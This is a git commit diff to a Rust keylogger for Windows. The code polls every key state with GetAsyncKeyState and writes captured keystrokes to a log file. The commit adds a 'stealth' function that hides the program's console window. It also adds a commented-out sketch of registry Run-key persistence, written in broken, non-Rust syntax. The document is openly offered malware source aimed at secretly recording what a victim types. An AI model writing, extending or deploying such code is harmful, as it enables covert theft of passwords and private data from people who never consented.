a77dcb158fefe46fbc20798025a0e70f13b67510
Ak <akshay.deep0@gmail.com>
2018-01-27 16:19:32 +0530

    add option to hide window

--- src/main.rs
+++ src/main.rs
@@ -1,9 +1,9 @@
 extern crate winapi;
 extern crate user32;
+extern crate kernel32;
 
+use std::{thread, time};
 use std::io::prelude::*;
-use std::time::UNIX_EPOCH;
-use std::time::SystemTime;
 use std::fs::OpenOptions;
 
 
@@ -11,7 +11,7 @@ const LOG_FILE: &str = "records.data";
 const LOG_AFTER: u64 = 20; // sec
 
 fn timestamp() -> u64 {
-	match SystemTime::now().duration_since(UNIX_EPOCH) {
+	match time::SystemTime::now().duration_since(time::UNIX_EPOCH) {
 		Ok(result) => result.as_secs(),
 		Err(_) => 0
 	}
@@ -37,6 +37,7 @@ fn start_logger(){
 	let mut collection = vec![(1 as i32)];
 
 	loop {
+		thread::sleep(time::Duration::from_millis(10));
 		for i in 1..256 {
 			if unsafe { user32::GetAsyncKeyState(i) } == -32767 {
 				collection.push(i);
@@ -49,12 +50,34 @@ fn start_logger(){
 				collection.clear();
 				start = current_time;
 			}
-		}	
+		}
 	}
 }
+
+fn stealth(){
+	let title = std::ffi::CString::new("keylogger").unwrap();
+	unsafe{
+		kernel32::SetConsoleTitleA(title.as_ptr());
+		kernel32::AllocConsole();
+		let win = user32::FindWindowA(std::ptr::null_mut(), title.as_ptr());
+        user32::ShowWindow(win, 0);   
+	}
+}
+
+// fn register(){
+// 	let app = "C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Windows\\MyApp.exe";
+// 	let key = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
+// 	HKEY hkey = NULL;
+// 	LONG createStatus = RegCreateKey(HKEY_CURRENT_USER, L, &hkey); //Creates a key       
+// 	LONG status = RegSetValueEx(hkey, L"MyApp", 0, REG_SZ, (BYTE *)progPath.c_str(), (progPath.size()+1) * sizeof(wchar_t));
+// }
 
 
 
 fn main() {
+	// let args: Vec<String> = env::args().collect();
+ //    println!("{:?}", args);
+    
+	stealth();
 	start_logger();
 }
